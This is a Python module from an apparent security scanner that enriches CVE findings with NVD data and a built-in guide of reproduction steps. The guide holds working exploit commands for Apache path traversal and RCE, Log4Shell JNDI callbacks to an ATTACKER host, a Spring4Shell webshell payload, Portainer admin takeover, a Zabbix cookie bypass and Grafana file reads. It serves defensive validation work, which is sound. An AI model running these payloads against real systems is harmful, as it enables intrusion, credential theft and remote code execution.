"""
cve_enricher.py — Enriquecimento de findings de CVE.

Para cada finding com cve != NULL mas sem description/reproduction:
  1. Consulta NVD API para obter descrição, CVSS, referencias e CWE
  2. Aplica base local de instruções de reprodução (PoC / payloads)
  3. Atualiza o finding com: description, cvss real, severity correta,
     reproduction_steps, affected_versions, patch_url

Chamado sob demanda (POST /scans/{id}/enrich-cves) ou ao finalizar scan.
"""

from __future__ import annotations

import logging
import time
from datetime import datetime
from typing import Any

import requests
from sqlalchemy.orm import Session
from sqlalchemy.orm.attributes import flag_modified

logger = logging.getLogger(__name__)

_NVD_API = "https://services.nvd.nist.gov/rest/json/cves/2.0"
_NVD_CVE_URL = "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId={cve_id}"
_NVD_CACHE: dict[str, dict] = {}

# ─────────────────────────────────────────────────────────────────────────────
# Base local de reprodução — CVEs de alto impacto com PoC documentado
# ─────────────────────────────────────────────────────────────────────────────
CVE_REPRODUCTION_GUIDE: dict[str, dict] = {
    # Apache
    "CVE-2021-41773": {
        "description": "Path traversal e possível RCE no Apache HTTP Server 2.4.49. "
                       "Requer mod_cgi habilitado para RCE. Path traversal é explorado sem autenticação.",
        "affected_versions": "Apache HTTP Server 2.4.49 apenas",
        "reproduction_steps": [
            "Verificar versão: curl -I https://TARGET | grep Server",
            "Testar path traversal: curl 'https://TARGET/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd'",
            "Testar RCE (requer mod_cgi): curl -s --path-as-is -d 'echo Content-Type: text/plain; echo; id' 'https://TARGET/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'",
        ],
        "payload": "curl 'https://TARGET/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd'",
        "patch_url": "https://httpd.apache.org/security/vulnerabilities_24.html",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2021-41773"],
    },
    "CVE-2021-42013": {
        "description": "Bypass do fix do CVE-2021-41773 no Apache 2.4.49/2.4.50. "
                       "Duplo encoding permite traversal e RCE.",
        "affected_versions": "Apache HTTP Server 2.4.49, 2.4.50",
        "reproduction_steps": [
            "Testar traversal com duplo encoding: curl 'https://TARGET/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd'",
            "Ou: curl 'https://TARGET/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd'",
        ],
        "payload": "curl 'https://TARGET/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd'",
        "patch_url": "https://httpd.apache.org/security/vulnerabilities_24.html",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2021-42013"],
    },
    # Log4Shell
    "CVE-2021-44228": {
        "description": "RCE crítico no Apache Log4j2 ≤ 2.14.1 via JNDI lookup. "
                       "Qualquer campo logado com ${jndi:ldap://attacker/a} executa código remoto. "
                       "Uma das CVEs mais exploradas de 2021-2022.",
        "affected_versions": "log4j-core 2.0-beta9 a 2.14.1",
        "reproduction_steps": [
            "Setup listener: python3 -m http.server 8888",
            "Testar via header: curl -H 'X-Api-Version: ${jndi:ldap://ATTACKER:1389/a}' https://TARGET/",
            "Testar via User-Agent: curl -A '${jndi:ldap://ATTACKER:1389/a}' https://TARGET/",
            "Usar interactsh para confirmar OOB: curl -H 'X-Forwarded-For: ${jndi:dns://INTERACTSH_HOST/a}' https://TARGET/",
        ],
        "payload": "curl -H 'X-Api-Version: ${jndi:ldap://ATTACKER:1389/a}' https://TARGET/",
        "patch_url": "https://logging.apache.org/log4j/2.x/security.html",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
            "https://github.com/advisories/GHSA-jfh8-c2jp-hdp3",
        ],
    },
    # Spring4Shell
    "CVE-2022-22965": {
        "description": "RCE no Spring MVC / Spring WebFlux (Spring Framework < 5.3.18). "
                       "Explora ClassLoader via Data Binding para escrever JSP no webroot.",
        "affected_versions": "Spring Framework < 5.3.18 e < 5.2.20 em JDK 9+",
        "reproduction_steps": [
            "Verificar versão do Spring no response header ou /actuator/info",
            "PoC: curl -X POST 'https://TARGET/?' -d 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di+if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B+java.io.InputStream+in+%3D+%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B'",
        ],
        "payload": "# Ver https://github.com/BobTheShoplifter/Spring4Shell-POC para PoC completo",
        "patch_url": "https://spring.io/security/cve-2022-22965",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2022-22965"],
    },
    # Ghostcat
    "CVE-2020-1938": {
        "description": "Ghostcat — leitura de arquivos e possível RCE via AJP connector do Tomcat. "
                       "Porta AJP 8009 exposta sem autenticação permite ler qualquer arquivo do webapps.",
        "affected_versions": "Apache Tomcat 6.x, 7.x < 7.0.100, 8.x < 8.5.51, 9.x < 9.0.31, 10.x < 10.0.0-M4",
        "reproduction_steps": [
            "Verificar porta AJP aberta: nmap -p 8009 TARGET",
            "Usar exploit: python3 ghostcat.py -u TARGET -p 8009 -f '/WEB-INF/web.xml'",
            "Ferramenta: https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi",
        ],
        "payload": "python3 ghostcat.py -u TARGET -p 8009 -f '/WEB-INF/web.xml'",
        "patch_url": "https://tomcat.apache.org/security-9.html",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2020-1938"],
    },
    # Drupalgeddon
    "CVE-2018-7600": {
        "description": "Drupalgeddon 2 — RCE sem autenticação no Drupal < 7.58, 8.x < 8.3.9. "
                       "Exploração massiva por botnets em 2018.",
        "affected_versions": "Drupal < 7.58 / 8.x < 8.3.9 / 8.4.x < 8.4.6 / 8.5.x < 8.5.1",
        "reproduction_steps": [
            "Detectar Drupal: curl -I https://TARGET/ | grep -i x-generator",
            "PoC: python3 drupalgeddon2.py https://TARGET/",
            "Ferramenta: https://github.com/dreadlocked/Drupalgeddon2",
        ],
        "payload": "python3 drupalgeddon2.py https://TARGET/",
        "patch_url": "https://www.drupal.org/sa-core-2018-002",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2018-7600"],
    },
    # jQuery
    "CVE-2019-11358": {
        "description": "Prototype Pollution no jQuery < 3.4.0. "
                       "$.extend() com deep=true permite sobrescrever Object.prototype, "
                       "podendo levar a XSS ou alteração de comportamento da aplicação.",
        "affected_versions": "jQuery < 3.4.0",
        "reproduction_steps": [
            "Verificar versão: curl https://TARGET/ | grep -o 'jquery[.-][0-9.]*' | head -1",
            "PoC (browser console): $.extend(true, {}, JSON.parse('{\"__proto__\":{\"polluted\":\"yes\"}}'))",
            "Verificar: ({}).polluted === 'yes'",
        ],
        "payload": "$.extend(true, {}, JSON.parse('{\"__proto__\":{\"polluted\":\"yes\"}}'))",
        "patch_url": "https://blog.jquery.com/2019/04/10/jquery-3-4-0-released/",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2019-11358"],
    },
    # Portainer
    "CVE-2022-26336": {
        "description": "Portainer < 2.11.1 permite acesso não autenticado à API de containers Docker. "
                       "Admin account pode ser criado sem autenticação na inicialização.",
        "affected_versions": "Portainer < 2.11.1",
        "reproduction_steps": [
            "Verificar se Portainer está inicializado: curl -k https://TARGET:9443/api/status",
            "Se não inicializado, criar admin: curl -X POST https://TARGET:9443/api/users/admin/init -d '{\"Password\":\"attackerpassword\"}'",
            "Se inicializado, checar /api/users/admin/check para confirmar",
        ],
        "payload": "curl -X POST https://TARGET:9443/api/users/admin/init -d '{\"Password\":\"attackerpassword\"}'",
        "patch_url": "https://docs.portainer.io/release-notes",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2022-26336"],
    },
    # Zabbix
    "CVE-2022-23131": {
        "description": "Zabbix < 5.4.9 SAML SSO Authentication Bypass. "
                       "Manipulação do cookie zbx_session permite bypass de autenticação e acesso como admin.",
        "affected_versions": "Zabbix 5.4.0 - 5.4.8",
        "reproduction_steps": [
            "Verificar versão: curl https://TARGET/zabbix.php?action=login | grep -i version",
            "Criar cookie manipulado: python3 -c \"import json,base64; print(base64.b64encode(json.dumps({'saml':True,'username':'Admin'}).encode()))\"",
            "Usar cookie: curl -b 'zbx_session=<ENCODED>' https://TARGET/zabbix.php?action=dashboard.view",
        ],
        "payload": "# PoC: https://github.com/Mr-xn/cve-2022-23131",
        "patch_url": "https://support.zabbix.com/browse/ZBX-20350",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2022-23131"],
    },
    # Grafana path traversal
    "CVE-2021-43798": {
        "description": "Grafana < 8.3.1 path traversal que permite leitura de arquivos locais "
                       "via /public/plugins/<PLUGIN_ID>/../../../etc/passwd. Não requer autenticação.",
        "affected_versions": "Grafana 8.0.0 - 8.3.0",
        "reproduction_steps": [
            "Verificar Grafana: curl https://TARGET/login | grep -i grafana",
            "Testar traversal: curl --path-as-is https://TARGET/public/plugins/alertlist/../../../../etc/passwd",
            "Ler arquivo de configuração: curl --path-as-is https://TARGET/public/plugins/text/../../../../etc/grafana/grafana.ini",
        ],
        "payload": "curl --path-as-is https://TARGET/public/plugins/alertlist/../../../../etc/passwd",
        "patch_url": "https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-critical-security-fix/",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2021-43798"],
    },
    # OpenSSH MitM (recente nos findings)
    "CVE-2025-26465": {
        "description": "OpenSSH Client MitM Authentication Bypass (< 9.9p2). "
                       "Quando VerifyHostKeyDNS=yes está habilitado, um atacante MitM pode ser aceito "
                       "como servidor legítimo mesmo com chave diferente.",
        "affected_versions": "OpenSSH client < 9.9p2",
        "reproduction_steps": [
            "Verificar versão: ssh -V",
            "Explorar requer posição MitM na rede: arpspoof / bettercap",
            "Configuração vulnerável: VerifyHostKeyDNS=yes no ssh_config",
        ],
        "payload": "# Requer posição MitM — ver https://www.qualys.com/2025/02/18/cve-2025-26465/openssh.txt",
        "patch_url": "https://www.openssh.com/releasenotes.html",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2025-26465"],
    },
}


def _fetch_nvd_cve(cve_id: str) -> dict:
    """Busca dados completos de uma CVE no NVD."""
    if cve_id in _NVD_CACHE:
        return _NVD_CACHE[cve_id]

    try:
        resp = requests.get(
            _NVD_API,
            params={"cveId": cve_id},
            timeout=15,
            headers={"User-Agent": "EASM-Security-Scanner/1.0"},
        )
        if resp.status_code == 429:
            return {}
        resp.raise_for_status()
        data = resp.json()
        vulns = data.get("vulnerabilities") or []
        if not vulns:
            _NVD_CACHE[cve_id] = {}
            return {}
        cve_data = dict((vulns[0].get("cve") or {}))
    except Exception as exc:
        logger.debug("NVD fetch error for %s: %s", cve_id, exc)
        _NVD_CACHE[cve_id] = {}
        return {}

    # Description
    description = ""
    for d in (cve_data.get("descriptions") or []):
        if dict(d).get("lang") == "en":
            description = str(dict(d).get("value") or "")[:1000]
            break

    # CVSS
    cvss = 0.0
    severity = "medium"
    metrics = dict(cve_data.get("metrics") or {})
    for key in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
        metric_list = metrics.get(key) or []
        if metric_list:
            m = dict(metric_list[0])
            cvss_data = dict(m.get("cvssData") or {})
            try:
                cvss = float(cvss_data.get("baseScore") or 0)
                severity = str(cvss_data.get("baseSeverity") or "MEDIUM").lower()
            except (TypeError, ValueError):
                pass
            break

    # CWE
    cwes = []
    for weakness in (cve_data.get("weaknesses") or []):
        for wd in (dict(weakness).get("description") or []):
            cwe = dict(wd).get("value") or ""
            if cwe.startswith("CWE-"):
                cwes.append(cwe)

    # References
    refs = [
        str(dict(r).get("url") or "") for r in (cve_data.get("references") or [])
        if dict(r).get("url")
    ][:5]

    result = {
        "description": description,
        "cvss": cvss,
        "severity": severity,
        "cwes": cwes,
        "references": refs,
        "nvd_url": f"https://nvd.nist.gov/vuln/detail/{cve_id}",
    }
    _NVD_CACHE[cve_id] = result
    time.sleep(0.1)  # NVD rate limit
    return result


def enrich_cve_finding(finding: Any, db: Session, *, force: bool = False) -> bool:
    """
    Enriquece um finding de CVE com description, reproduction steps, CVSS e referências.
    Retorna True se atualizado.

    Args:
        force: se True, re-enriquece mesmo que já tenha cve_description preenchido.
    """
    cve_id = str(finding.cve or "").upper()
    if not cve_id.startswith("CVE-"):
        return False

    details = dict(finding.details or {})

    # Já enriquecido com cve_description? Pula, a menos que force=True
    already_has_desc = bool(str(details.get("cve_description") or "").strip())
    if not force and already_has_desc and details.get("enriched"):
        return False

    # 1. Base local (mais rica, com PoC)
    local = CVE_REPRODUCTION_GUIDE.get(cve_id, {})

    # 2. NVD para CVEs não na base local
    nvd = {}
    if not local.get("description"):
        nvd = _fetch_nvd_cve(cve_id)

    description = local.get("description") or nvd.get("description") or details.get("description") or ""
    cvss_real = nvd.get("cvss") or finding.cvss
    severity_real = nvd.get("severity") or str(finding.severity or "high")
    cwes = nvd.get("cwes") or []
    references = (local.get("references") or []) + (nvd.get("references") or [])
    nvd_url = f"https://nvd.nist.gov/vuln/detail/{cve_id}"

    reproduction_steps = local.get("reproduction_steps") or []
    payload = local.get("payload") or ""
    patch_url = local.get("patch_url") or ""
    affected_versions = local.get("affected_versions") or ""

    # Atualizar details — cve_description é o campo canônico exposto na API
    details.update({
        "enriched": True,
        "cve_description": description,   # ← campo canônico para UI e API
        "description": description,       # ← mantém retrocompatibilidade
        "cvss": cvss_real,
        "cwes": cwes,
        "references": list(dict.fromkeys(references + [nvd_url]))[:8],
        "nvd_url": nvd_url,
        "affected_versions": affected_versions,
        "reproduction_steps": reproduction_steps,
        "payload": payload,
        "patch_url": patch_url,
        "validation_status": "confirmed" if local else "hypothesis",
    })

    finding.details = details
    # JSONB mutation must be signaled explicitly — SQLAlchemy may not detect
    # dict replacement on mutable JSONB columns without this call.
    try:
        flag_modified(finding, "details")
    except Exception:
        pass

    if cvss_real and cvss_real > 0:
        finding.cvss = float(cvss_real)
        finding.risk_score = min(10, int(round(float(cvss_real))))

    if severity_real and severity_real in ("critical", "high", "medium", "low", "info"):
        finding.severity = severity_real

    # Atualiza título quando é apenas o CVE ID em bruto (ex: "CVE-2025-14177")
    current_title = str(finding.title or "").strip()
    title_is_bare_cve = current_title.upper() == cve_id
    if description and (title_is_bare_cve or not current_title):
        desc_short = description.split(".")[0][:100].strip()
        if desc_short:
            finding.title = f"{cve_id}: {desc_short}"[:500]

    finding.updated_at = datetime.utcnow() if hasattr(finding, "updated_at") else None

    return True


def enrich_scan_cves(db: Session, scan_id: int, *, limit: int = 200) -> int:
    """
    Enriquece todos os findings de CVE de um scan que ainda não foram enriquecidos.
    Retorna quantidade enriquecida.
    """
    from app.models.models import Finding

    findings = (
        db.query(Finding)
        .filter(
            Finding.scan_job_id == scan_id,
            Finding.cve.isnot(None),
        )
        .limit(limit)
        .all()
    )

    enriched = 0
    for f in findings:
        try:
            if enrich_cve_finding(f, db):
                enriched += 1
        except Exception as exc:
            logger.debug("enrich_cve_finding error for %s: %s", f.cve, exc)

    if enriched:
        try:
            db.commit()
        except Exception:
            db.rollback()

    logger.info("enrich_scan_cves: enriched %d / %d CVE findings for scan %s", enriched, len(findings), scan_id)
    return enriched


def enrich_all_cves(db: Session, *, limit: int = 500, owner_id: int | None = None) -> int:
    """
    Enriquece TODOS os findings com CVE que ainda não têm cve_description.
    Usado para backfill de dados históricos.

    Args:
        limit: máximo de findings a processar por chamada
        owner_id: se fornecido, restringe ao usuário (via scan_job.owner_id)

    Retorna quantidade de findings enriquecidos.
    """
    from app.models.models import Finding, ScanJob

    from sqlalchemy import or_, cast, String, text as sa_text

    # Findings com CVE mas sem cve_description preenchido, OU com title = bare CVE ID
    query = (
        db.query(Finding)
        .filter(Finding.cve.isnot(None))
        .filter(
            or_(
                # cve_description ausente ou vazio no JSONB
                cast(Finding.details["cve_description"], String).is_(None),
                cast(Finding.details["cve_description"], String) == "",
                cast(Finding.details["cve_description"], String) == "null",
                # título ainda é o CVE em bruto (ex: "CVE-2025-14177")
                Finding.title == Finding.cve,
            )
        )
    )

    if owner_id is not None:
        query = query.join(ScanJob, Finding.scan_job_id == ScanJob.id).filter(ScanJob.owner_id == owner_id)

    findings = query.limit(limit).all()

    enriched = 0
    batch_size = 20
    for i, f in enumerate(findings):
        try:
            if enrich_cve_finding(f, db, force=False):
                enriched += 1
        except Exception as exc:
            logger.warning("enrich_all_cves: error for finding %s cve=%s: %s", f.id, f.cve, exc)

        # Commit em batches para evitar transação longa
        if (i + 1) % batch_size == 0:
            try:
                db.commit()
                logger.info("enrich_all_cves: batch commit %d/%d (enriched so far: %d)", i + 1, len(findings), enriched)
            except Exception as exc:
                logger.error("enrich_all_cves: batch commit error: %s", exc)
                db.rollback()

    # Commit final
    try:
        db.commit()
    except Exception as exc:
        logger.error("enrich_all_cves: final commit error: %s", exc)
        db.rollback()

    logger.info("enrich_all_cves: enriched %d / %d total CVE findings", enriched, len(findings))
    return enriched
